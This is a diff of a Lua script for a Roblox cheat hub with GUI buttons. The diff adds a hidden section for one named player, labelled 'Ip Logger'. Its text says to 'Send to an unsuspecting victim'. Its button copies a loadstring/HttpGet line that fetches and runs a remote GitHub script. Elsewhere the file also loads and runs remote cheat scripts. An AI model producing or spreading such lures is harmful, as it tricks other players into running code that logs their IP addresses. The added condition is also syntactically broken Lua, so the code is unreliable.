@@ -411,6 +411,7 @@ Main:AddButton({
 })
 
 
+
 -------------------------------- Owl Hub --------------------------------
 	Main:AddButton({
 	Name = "Owl Hub",
@@ -443,6 +444,19 @@ Main:AddDropdown({
 		Print(Value)
 	end    
 })
+
+if Player.Name = "DestinnyAngel" then
+local Section = Main:AddSection({
+	Name = "Beam Player"
+})
+Tab:AddParagraph("Ip Logger","Send to an unsuspecting victim..")
+Main:AddButton({
+	Name = "Beam Player for me only",
+	Callback = function()
+		setclipboard("loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/infinite/main/.lua'),true))()")
+  	end    
+})
+end
 
 
 
@@ -890,6 +904,7 @@ Scripts:AddButton({
 		loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
   	end    
 })
+
 
 
 
